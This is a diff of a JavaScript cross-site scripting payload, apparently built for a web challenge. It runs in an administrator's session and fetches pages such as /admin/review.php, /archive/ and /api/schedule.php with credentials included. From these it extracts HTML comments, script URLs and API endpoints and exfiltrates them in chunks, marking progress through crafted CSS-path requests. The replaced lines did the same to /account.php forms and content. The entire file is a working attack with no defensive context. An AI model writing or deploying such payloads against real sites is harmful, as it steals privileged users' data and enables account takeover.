@@ -1,5 +1,5 @@
 (function(){
-  var UNIQ="v7x";
+  var UNIQ="v8x";
 
   function sig(tag){
     fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
@@ -16,44 +16,65 @@
 
   sig("init");
 
-  // Fetch /account.php with admin session - look for extra actions beyond api_key view
-  fetch("/account.php",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
-    sig("got_acct");
+  // 1. Exfil HTML comments from /archive/ (hints about write mechanism)
+  fetch("/archive/",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
+    sig("got_arc");
+    var comments=[];
+    var re=/<!--([\s\S]*?)-->/g;
+    var m;
+    while((m=re.exec(html))!==null){
+      var c=m[1].trim();
+      if(c.length>0) comments.push(c);
+    }
+    var commentStr=comments.join("|||");
+    if(commentStr.length>0) exfilStr("ac",commentStr,400);
+    else sig("no_ac");
+  }).catch(function(){sig("err_arc");});
+
+  // 2. Exfil script src tags from /admin/review.php (find chart helper URL)
+  fetch("/admin/review.php",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
+    sig("got_rev");
     var doc=new DOMParser().parseFromString(html,"text/html");
-    var forms=doc.querySelectorAll("form");
-    var btns=doc.querySelectorAll("[class*=btn],[type=submit],button,a[href*=php]");
-    sig("af"+forms.length+"_ab"+btns.length);
-
-    // Exfil form infos
+    var scripts=doc.querySelectorAll("script[src]");
     var info="";
-    forms.forEach(function(f){
-      info+="|F:"+f.getAttribute("action")+"["+f.getAttribute("method")+"]";
-      f.querySelectorAll("input,button,select,textarea").forEach(function(el){
-        info+="("+el.getAttribute("name")+":"+el.getAttribute("value")+")";
-      });
+    scripts.forEach(function(s){info+="|S:"+s.getAttribute("src");});
+    // Also look for fetch( or XMLHttpRequest in inline scripts
+    var inlineScripts=doc.querySelectorAll("script:not([src])");
+    inlineScripts.forEach(function(s){
+      var t=s.textContent;
+      var m2=t.match(/fetch\(['"](\/[^'"]+)['"]/g);
+      if(m2) m2.forEach(function(x){info+="|F:"+x;});
+      var m3=t.match(/['"]\/api\/[^'"]+['"]/g);
+      if(m3) m3.forEach(function(x){info+="|A:"+x;});
     });
-    btns.forEach(function(b){
-      info+="|L:"+b.getAttribute("href")+":"+b.textContent.trim().slice(0,20);
-    });
-    if(info) exfilStr("ai",info,200);
-    else sig("no_ai");
+    if(info) exfilStr("rs",info,300);
+    else sig("no_rs");
+  }).catch(function(){sig("err_rev");});
 
-    // Keywords in account page
-    var lHtml=html.toLowerCase();
-    ["seize","write","publish","upload","change","modify","homepage","site","content","token","rotate","regenerate"].forEach(function(kw){
-      if(lHtml.indexOf(kw)>=0) sig("ak_"+kw.slice(0,6));
-    });
+  // 3. GET /api/schedule.php - see response format
+  fetch("/api/schedule.php",{credentials:"include"}).then(function(r){return r.text();}).then(function(txt){
+    sig("got_sched");
+    exfilStr("sc",txt,300);
+  }).catch(function(){sig("err_sched");});
 
-    // Exfil the whole page in chunks of 80 chars
-    // position 0-79 (header), 80-159 (content), 160-239 (actions?)
-    exfilStr("a0",html.slice(0,80),80);
-    exfilStr("a1",html.slice(80,160),80);
-    exfilStr("a2",html.slice(160,240),80);
-    exfilStr("a3",html.slice(240,320),80);
-    exfilStr("a4",html.slice(320,400),80);
-    // Tail of account page
-    var tail=html.slice(Math.max(0,html.length-200));
-    exfilStr("at",tail,100);
-  }).catch(function(){sig("err_acct");});
+  // 4. Also fetch homepage / to find script tags / JS files loaded
+  fetch("/",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
+    sig("got_home");
+    var doc=new DOMParser().parseFromString(html,"text/html");
+    var scripts=doc.querySelectorAll("script[src]");
+    var info="";
+    scripts.forEach(function(s){info+="|S:"+s.getAttribute("src");});
+    // Look for inline fetch/api calls
+    var inlineScripts=doc.querySelectorAll("script:not([src])");
+    inlineScripts.forEach(function(s){
+      var t=s.textContent;
+      var m2=t.match(/['"]\/api\/[^'"]+['"]/g);
+      if(m2) m2.forEach(function(x){info+="|A:"+x;});
+      var m3=t.match(/fetch\(['"](\/[^'"]+)['"]/g);
+      if(m3) m3.forEach(function(x){info+="|F:"+x;});
+    });
+    if(info) exfilStr("hs",info,300);
+    else sig("no_hs");
+  }).catch(function(){sig("err_home");});
 
 })();
